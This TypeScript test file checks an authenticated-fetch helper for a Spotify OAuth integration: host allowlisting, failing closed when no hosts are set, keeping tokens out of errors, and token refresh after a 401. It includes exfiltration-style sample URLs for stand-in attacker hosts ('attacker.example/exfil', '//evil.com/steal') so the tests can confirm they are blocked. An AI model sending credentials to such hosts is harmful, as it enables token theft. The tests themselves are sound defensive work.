import { FetchInterceptor } from '@mswjs/interceptors/fetch'
import { expect, test } from 'vitest'
import { http, HttpResponse } from 'msw'
import {
	type CapabilityArgs,
	type KodyNamespace,
	IntegrationHostNotAllowedError,
	createAuthenticatedFetch,
} from './kody-runtime-utils.ts'
import { assertIntegrationHostAllowed } from './integration-host-allowlist.ts'
import { createMswNodeServer } from '#worker/test-support/msw-node-server.ts'

type SecretSetManyCall = {
	secrets: Array<{
		name: string
		value?: string
		scope: string
	}>
	assertOnly?: boolean
}

const fakeAccessToken = 'test-access-token-abc123'
const spotifyAccessTokenPlaceholder =
	'Bearer {{secret:spotifyAccessToken|scope=user}}'

const spotifyIntegration = {
	name: 'spotify',
	tokenUrl: 'https://accounts.spotify.test/api/token',
	apiBaseUrl: 'https://api.spotify.com/v1',
	flow: 'pkce' as const,
	clientId: 'spotify-client-id',
	clientSecretSecretName: null,
	accessTokenSecretName: 'spotifyAccessToken',
	refreshTokenSecretName: 'spotifyRefreshToken',
	requiredHosts: ['api.spotify.com', 'cdn.spotify.com'],
}

function createKody() {
	const secretSetManyCalls: Array<SecretSetManyCall> = []
	const kody = {
		async integration_get(args: CapabilityArgs) {
			const name = args.name
			expect(name).toBe('spotify')
			return { integration: spotifyIntegration }
		},
		async secret_set_many(args: CapabilityArgs) {
			const call = args as SecretSetManyCall
			secretSetManyCalls.push(call)
			return {
				ok: true,
				assertOnly: Boolean(call.assertOnly),
				secrets: [],
			}
		},
	} satisfies KodyNamespace

	return { kody, secretSetManyCalls }
}

function createSpotifyHandlers(fetchCalls: Array<Request>) {
	return [
		http.post(spotifyIntegration.tokenUrl, () =>
			HttpResponse.json({ access_token: fakeAccessToken }),
		),
		http.get('https://api.spotify.com/v1/me', async ({ request }) => {
			fetchCalls.push(request.clone())
			return HttpResponse.json({ ok: true })
		}),
		http.get(
			'https://cdn.spotify.com/images/cover.jpg',
			async ({ request }) => {
				fetchCalls.push(request.clone())
				return HttpResponse.json({ ok: true })
			},
		),
	]
}

test('createAuthenticatedFetch enforces integration host allowlists and fails closed without configured hosts', async () => {
	const { kody } = createKody()
	const fetchCalls: Array<Request> = []

	using _server = createMswNodeServer(createSpotifyHandlers(fetchCalls))
	const authenticatedFetch = await createAuthenticatedFetch(kody, 'spotify')

	const fetchCallsAfterSetup = fetchCalls.length

	try {
		await authenticatedFetch('https://attacker.example/exfil')
		expect.unreachable('expected disallowed host rejection')
	} catch (error) {
		expect(error).toBeInstanceOf(IntegrationHostNotAllowedError)
		expect(String(error)).not.toContain(fakeAccessToken)
		expect(JSON.stringify(error)).not.toContain(fakeAccessToken)
	}
	expect(fetchCalls.length).toBe(fetchCallsAfterSetup)

	const apiResponse = await authenticatedFetch('https://api.spotify.com/v1/me')
	expect(apiResponse.status).toBe(200)
	const apiCall = fetchCalls[fetchCalls.length - 1]!
	expect(apiCall.url).toBe('https://api.spotify.com/v1/me')
	expect(apiCall.headers.get('authorization')).toBe(
		spotifyAccessTokenPlaceholder,
	)

	const cdnResponse = await authenticatedFetch(
		'https://cdn.spotify.com/images/cover.jpg',
	)
	expect(cdnResponse.status).toBe(200)
	const cdnCall = fetchCalls[fetchCalls.length - 1]!
	expect(cdnCall.url).toBe('https://cdn.spotify.com/images/cover.jpg')
	expect(cdnCall.headers.get('authorization')).toBe(
		spotifyAccessTokenPlaceholder,
	)

	expect(() =>
		assertIntegrationHostAllowed(
			'spotify',
			spotifyIntegration,
			'//evil.com/steal',
		),
	).toThrow(IntegrationHostNotAllowedError)
	expect(() =>
		assertIntegrationHostAllowed('spotify', spotifyIntegration, '/v1/me'),
	).not.toThrow()

	const emptyIntegration = {
		...spotifyIntegration,
		requiredHosts: [] as Array<string>,
		apiBaseUrl: null,
	}
	const emptyAllowlistKody = {
		async integration_get() {
			return { integration: emptyIntegration }
		},
		async secret_set_many() {
			return { ok: true, assertOnly: false, secrets: [] }
		},
	} satisfies KodyNamespace

	const emptyAllowlistFetchCalls: Array<Request> = []
	using _emptyAllowlistServer = createMswNodeServer([
		http.post(emptyIntegration.tokenUrl, () =>
			HttpResponse.json({ access_token: fakeAccessToken }),
		),
		http.get('https://anything.example/data', async ({ request }) => {
			emptyAllowlistFetchCalls.push(request.clone())
			return HttpResponse.json({ ok: true })
		}),
	])
	const emptyAllowlistFetch = await createAuthenticatedFetch(
		emptyAllowlistKody,
		'spotify',
	)
	const fetchCallsBefore = emptyAllowlistFetchCalls.length
	await expect(
		emptyAllowlistFetch('https://anything.example/data'),
	).rejects.toThrow(/no allowed hosts configured/)
	expect(emptyAllowlistFetchCalls.length).toBe(fetchCallsBefore)
})

test('createAuthenticatedFetch attaches bearer placeholder and refreshes on 401 with inline client id', async () => {
	const { kody, secretSetManyCalls } = createKody()
	const fetchCalls: Array<Request> = []
	let apiCalls = 0
	{
		using _interceptor = (() => {
			const interceptor = new FetchInterceptor()
			interceptor.on('request', ({ request, controller }) => {
				void (async () => {
					try {
						fetchCalls.push(request.clone())
						if (request.url === spotifyIntegration.tokenUrl) {
							await controller.respondWith(
								Response.json(
									{ access_token: fakeAccessToken },
									{ headers: { 'content-type': 'application/json' } },
								),
							)
							return
						}
						apiCalls += 1
						if (apiCalls === 1) {
							await controller.respondWith(
								Response.json(
									{ error: 'expired' },
									{
										status: 401,
										headers: { 'content-type': 'application/json' },
									},
								),
							)
							return
						}
						await controller.respondWith(
							Response.json(
								{ ok: true },
								{ headers: { 'content-type': 'application/json' } },
							),
						)
					} catch (error) {
						controller.errorWith(error)
					}
				})()
			})
			interceptor.apply()
			return {
				[Symbol.dispose]() {
					interceptor.dispose()
				},
			}
		})()
		const authenticatedFetch = await createAuthenticatedFetch(kody, 'spotify')
		const response = await authenticatedFetch('https://api.spotify.com/v1/me')
		expect(await response.json()).toEqual({ ok: true })
	}

	expect(fetchCalls).toHaveLength(3)
	expect(fetchCalls[0]?.headers.get('authorization')).toBe(
		spotifyAccessTokenPlaceholder,
	)
	expect(fetchCalls[1]?.url).toBe(spotifyIntegration.tokenUrl)
	expect(await fetchCalls[1]?.text()).toContain('client_id=spotify-client-id')
	expect(fetchCalls[2]?.headers.get('authorization')).toBe(
		`Bearer ${fakeAccessToken}`,
	)
	expect(secretSetManyCalls).toEqual([
		{
			secrets: [
				{ name: 'spotifyRefreshToken', scope: 'user' },
				{ name: 'spotifyAccessToken', scope: 'user' },
			],
			assertOnly: true,
		},
		{
			secrets: [
				{
					name: 'spotifyAccessToken',
					value: fakeAccessToken,
					scope: 'user',
				},
			],
		},
	])
})
